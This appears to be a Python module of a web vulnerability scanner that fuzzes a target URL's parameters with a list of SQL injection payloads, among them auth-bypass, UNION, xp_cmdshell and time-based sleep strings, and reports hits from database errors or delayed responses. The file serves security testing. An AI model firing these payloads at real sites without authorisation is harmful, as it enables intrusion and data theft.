
import os
import sys

# Add parent directory to sys.path to allow imports from root
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import utils
from core.network import requester
from config import Colors, PAYLOAD_THREADS

# Comprehensive SQL Injection Payloads (Error, Boolean, Union, Time-based)
COMPREHENSIVE_SQL_PAYLOADS = [
    # Basic Auth Bypass & Logic
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
    "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", 
    "admin' --", "admin' #", "' OR 'a'='a",
    "') OR ('1'='1", "') OR '1'='1",
    
    # Union Based (Cross-DB)
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION SELECT 1,@@version--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    
    # Error Based
    "'; EXEC xp_cmdshell('dir');--", 
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    " OR 1=1",
    
    # Time Based (Crucial for finding Blind SQLi)
    # MySQL
    "1' AND SLEEP(5)--", "1\" AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # PostgreSQL
    "1' AND PG_SLEEP(5)--", 
    "1'; SELECT PG_SLEEP(5)--",
    
    # MSSQL
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    
    # Oracle
    "1' AND 1234=(SELECT 1234 FROM DUAL CONNECT BY LEVEL<=10000)--",
    
    # Advanced / Polyglots
    "SLEEP(5)#",
    "1 OR SLEEP(5)",
    "';WAITFOR DELAY '0:0:5'--",
    "benchmark(10000000,MD5(1))#",
    
    # Boolean Inferential
    "' AND 1=1--", "' AND 1=2--", 
    "1 AND 1=1", "1 AND 1=0"
]

def scan(url):
    """Comprehensive SQL Injection scanner with time-based detection."""
    if not utils.check_endpoint_alive(url):
        return []

    sql_payloads = COMPREHENSIVE_SQL_PAYLOADS.copy()
    
    # Try to load high-value external payloads
    try:
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        payload_dir = os.path.join(base_dir, "Payloads", "Sql_payload")
        extra_payloads = utils.load_payloads_from_dir(payload_dir)
        if extra_payloads:
            sql_payloads.extend(extra_payloads) # Unlocked: scan all payloads
    except:
        pass
    
    sql_payloads = list(set(sql_payloads))

    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading
    import time  # For measuring elapsed time
    
    vulnerabilities = []
    
    # Database error signatures
    error_signatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sqlserver",
        "microsoft ole db provider for sql server",
        "ora-00933",
        "postgresql query failed",
        "sqlite3.operationalerror",
        "pg_query(): query failed",
        "syntax error",
        "fatal error"
    ]
    
    def test_target(target_data):
        test_url = target_data['url']
        payload = target_data['payload']
        param = target_data['param']
        
        try:
            start_time = time.time()
            response = requester.get(test_url, timeout=15) # Longer timeout for this specific request
            elapsed_time = time.time() - start_time
            
            if response:
                response_text = response.text.lower()
                
                # 1. Check for Error-Based
                if any(sig in response_text for sig in error_signatures):
                    matched_sig = next(sig for sig in error_signatures if sig in response_text)
                    impact_info = utils.get_vuln_details("SQL Injection", context=matched_sig)
                    return {
                        "type": "SQL Injection",
                        "payload": payload,
                        "evidence": f"Database Error: '{matched_sig}'",
                        "location": f"Parameter: {param} (URL: {test_url})",
                        "endpoint": url,
                        "parameter": param,
                        "confidence": "High",
                        "severity": "High",
                        "impact": impact_info["impact"],
                        "recommendation": impact_info["recommendation"]
                    }
                
                # 2. Check for Time-Based (Blind SQLi)
                # If payload has sleep/waitfor and response took > 5 errors
                low_payload = payload.lower()
                if "sleep" in low_payload or "waitfor" in low_payload or "benchmark" in low_payload:
                    if elapsed_time >= 5:
                        return {
                            "type": "Blind SQL Injection (Time-Based)",
                            "payload": payload,
                            "evidence": f"Server delayed response by {round(elapsed_time, 2)}s (Triggered by sleep payload)",
                            "location": f"Parameter: {param} (URL: {test_url})",
                            "endpoint": url,
                            "parameter": param,
                            "confidence": "High",
                            "severity": "Critical",
                            "impact": "Attacker can exfiltrate data byte-by-byte.",
                            "recommendation": "Use parameterized queries to prevent all forms of SQLi."
                        }

        except Exception as e:
            # If request timed out specifically on a sleep payload, that might be a hit too!
            if "timeout" in str(e).lower() and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
                 return {
                        "type": "Blind SQL Injection (Time-Based)",
                        "payload": payload,
                        "evidence": f"Request Timed Out (Potential sleep execution)",
                        "location": f"Parameter: {param} (URL: {test_url})",
                        "endpoint": url,
                        "parameter": param,
                        "confidence": "Medium",
                        "severity": "High",
                        "impact": "Attacker can exfiltrate data byte-by-byte.",
                        "recommendation": "Use parameterized queries to prevent all forms of SQLi."
                    }
            pass
        return None

    # Generate all attack tasks
    scan_tasks = []
    for payload in sql_payloads:
        fuzzed_targets = utils.generate_fuzzed_urls(url, payload)
        for target in fuzzed_targets:
            target['payload'] = payload
            scan_tasks.append(target)
            
    # Use moderate threads for accuracy (too many threads can cause false latency)
    # If we have too many tasks, we might want to chunk them or just let the pool handle it.
    
    with ThreadPoolExecutor(max_workers=PAYLOAD_THREADS) as executor:
        future_to_task = {executor.submit(test_target, t): t for t in scan_tasks}
        for future in as_completed(future_to_task):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
            except:
                pass

    return vulnerabilities

if __name__ == "__main__":
    import sys
    print("Standalone SQL Injection Scanner")
    if len(sys.argv) < 2:
        target = input("Enter target URL: ").strip()
    else:
        target = sys.argv[1]
    
    if target:
        results = scan(target)
        print(f"\nFound {len(results)} vulnerabilities.")
        for v in results:
            print(f"[-] {v['type']}: {v['payload']} ({v.get('impact', 'N/A')})")
